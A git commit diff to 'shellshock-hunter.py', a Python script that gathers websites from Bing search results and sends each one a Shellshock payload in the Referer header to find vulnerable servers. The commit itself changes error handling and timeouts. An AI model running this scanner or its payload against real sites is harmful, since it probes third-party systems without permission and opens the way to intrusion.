dbb7b997de1c11c675b529422ca0f9b0bba3669f
Dan McInerney <danhmcinerney@gmail.com>
2014-09-26 03:05:04 -0400

    error handling stuff

--- shellshock-hunter.py
+++ shellshock-hunter.py
@@ -11,6 +11,8 @@ import urllib2
 import argparse
 import sys
 import json
+import socket
+socket.setdefaulttimeout(60)
 
 __author__ = 'Dan McInerney'
 __site__ = 'danmcinerney.org'
@@ -42,13 +44,13 @@ def bing_search(query, key, offset, **kwargs):
     opener = urllib2.build_opener(handler)
     urllib2.install_opener(opener)
     try:
-        readURL = urllib2.urlopen(url, timeout=90).read()
+        readURL = urllib2.urlopen(url, timeout=60).read()
     except Exception as e:
-        sys.exit('[-] Failed to fetch bing results. Are you sure you have the right API key?')
+        sys.exit('[-] Failed to fetch bing results. Are you sure you have the right API key?\n      Error: '+str(e))
     return readURL
 
 def action(result):
-    ''' Perform this action on each result '''
+    ''' Make the payloaded request and check the response's headers for the echo msg'''
     global VULN_FOUND
     exploit = "() { :;}; echo 'Shellshock: Vulnerable'"
     ua = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0'
@@ -58,13 +60,14 @@ def action(result):
     req.add_header('User-Agent', ua)
     req.add_header('Referer', exploit)
     try:
-        r = urllib2.urlopen(req, timeout=90)
+        r = urllib2.urlopen(req, timeout=60)
     except Exception as e:
         return
     resp_headers = r.info()
     if 'shellshock' in r.info():
         VULN_FOUND = True
         print '[!] SHELLSHOCK VULNERABLE:', url
+    return
 
 def result_concurrency(results):
     ''' Open all the greenlet threads '''
@@ -80,6 +83,8 @@ def main():
     if not args.key:
         sys.exit('[!] Specify a Bing API key or get one here: https://datamarket.azure.com/dataset/bing/search')
     key = args.key
+    if len(key) not in (44, 43):
+        sys.exit('[-] Incorrect key length')
     query = args.search
     pages = int(args.pages)
     offset = 0
@@ -94,7 +99,7 @@ def main():
             print '[-] No more results found'
             break
         total_results += results
-    print '[*] Total results: %d' % len(total_results)
+    print '[*] Checking each search result...'
     result_concurrency(total_results)
     if not VULN_FOUND:
         print '[-] No vulnerable sites found'
